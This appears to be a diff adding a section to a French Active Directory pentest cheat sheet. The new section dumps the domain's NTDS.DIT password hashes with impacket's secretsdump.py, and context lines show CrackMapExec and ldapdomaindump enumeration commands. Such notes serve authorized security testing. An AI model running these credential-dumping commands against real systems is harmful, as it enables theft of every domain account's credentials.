@@ -19,3 +19,12 @@ cme smb <IP>/<MASK> -u <USER> -p <PASSWORD> --pass-pol
 ```
 ldapdomaindump.py -u "<domain.local>\<USER>" -p <PASS> -n <DNS ou IP-DC> <IP-DNS>
 ```
+
+### Récupérer le fichier NTDS.DIT
+
+_**Note :** nécessite les droits "Admins de domaine"._
+
+```
+# impacket
+secretsdump.py <DOMAIN.COM>/Administator:<PASSWORD>@<IP>
+```
